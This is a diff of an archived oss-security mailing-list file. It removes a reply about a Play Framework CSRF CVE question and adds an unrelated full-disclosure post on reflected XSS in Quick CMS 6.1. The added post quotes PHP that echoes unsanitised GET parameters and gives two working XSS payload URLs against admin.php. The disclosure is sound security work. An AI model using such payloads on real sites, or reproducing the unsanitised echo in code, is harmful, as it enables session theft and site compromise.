@@ -1,63 +1,62 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/18/1
-Message-ID: <CAAYo3BvcTv66Cr5m6p32u+AXLx1eyFwM+mfb2O4rZOHtnk__mw@mail.gmail.com>
-Date: Mon, 18 Jul 2016 12:12:11 +1000
-From: David Black <dblack@...assian.com>
-To: cve-assign@...re.org
-Cc: oss-security@...ts.openwall.com
-Subject: Re: CVE request for the Play Framework
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/19/7
+Message-ID: <CADLX=aFcG44oDaW57ZtFHm3D8e-aqhfRdMU=c0uaKLUCeXjJow@mail.gmail.com>
+Date: Tue, 19 Jan 2016 16:20:18 +0530
+From: Rahul Pratap Singh <techno.rps@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: Quick CMS v 6.1 XSS Vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On 15 July 2016 at 21:54, <cve-assign@...re.org> wrote:
+## FULL DISCLOSURE
 
-> -----BEGIN PGP SIGNED MESSAGE-----
-> Hash: SHA256
->
-> > In version 2.5.0 of the Play Framework a CSRF bypass that depends upon
-> > an implementation bug in chrome's beacon api was fixed.
->
-> We think additional information would help in deciding whether this is
-> commonly recognized as a Play Framework vulnerability (which would
-> have a CVE ID) or Play Framework security hardening (which would not
-> have a CVE ID). Our understanding thus far is:
->
->   - Play Framework is not an Atlassian product
->
+#Product    : Quick CMS
+#Version    : 6.1
+#Home page Link  : http://opensolution.org/home.html
+#Date        : 19/Jan/2016
 
+XSS Vulnerability:
 
-Correct.
+----------------------------------------
+Description:
+----------------------------------------
+ "sLangEdit" and "sSort" parameters are not sanitized that leads to
+Reflected XSS.
 
+----------------------------------------
+Vulnerable Code:
+----------------------------------------
+File Name: languages.php
 
+Found at line:23
+<h1><?php echo $lang['Languages'].( isset( $_GET['sLangEdit'] ) ? '
+'.$_GET['sLangEdit'] : null ); ?></h1>
 
->
->   -
-> https://github.com/playframework/playframework/pull/5527#discussion-diff-51786858
->     says "In order to make Play's CSRF filter more resilient to
->     browser plugin vulnerabilities and new extensions, the default
->     configuration for the CSRF filter has been made far more
->     conservative."
->
->   - Chromium issue 490015 has some debate about whether it is a
->     Chrome/Chromium vulnerability, e.g., "The issue is whether it's
->     the browser responsibility to act as a nanny to weak websites, or
->     we should leave weak websites as sacrifice for great justice."
->     versus "To be clear, this is a security bug ... There is a
->     security bug in Chrome, but no action is being done."
->
-> Typically, it would be best not to have a CVE for Play Framework if
-> the essence of the Play Framework problem is "the product did not
-> proactively add workarounds for all browser-level vulnerabilities that
-> might be discovered later."
->
+File Name: pages.php
 
+Found at line:49
+<form action="?p=pages<?php if( isset( $_GET['sSort'] ) ) echo
+'&amp;sSort='.$_GET['sSort']; ?>" name="form" method="post"
+class="main-form">
 
-Perhaps the question(s) should also be - "should a CVE be assigned to
-chrome/chromium?" or perhaps in general for CSRF protection implementations
-that make an assumption that at least currently does not hold up in a
-widely used browser (content-type is not as restricted in cross-domain
-requests as some have assumed) ?
+----------------------------------------
+Exploit:
+----------------------------------------
+localhost/Quick.Cms_v6.1-en/admin.php?p=languages&sLangEdit=</h1><script>alert("XSS")</script><h1>
+
+localhost/Quick.Cms_v6.1-en/admin.php?p=pages&sSort="><img%20src=x%20onerror=confirm(1)><!--
+
+----------------------------------------
+POC:
+----------------------------------------
+https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc.png
+https://0x62626262.files.wordpress.com/2016/01/quick-cms-v6-1xsspoc2.png
 
 
--- 
-David Black / Security Engineer.
+Disclosure Timeline:
+Tried to contact vendor via email  : 14/1/2016 ( email bounce back)
+Tried to contact vendor via forum : 18/1/2016 (thread deleted, no response)
+Public Disclosure: 19/1/2016
+
+Pub ref:
+https://0x62626262.wordpress.com/2016/01/19/quick-cms-v-6-1-xss-vulnerability
 
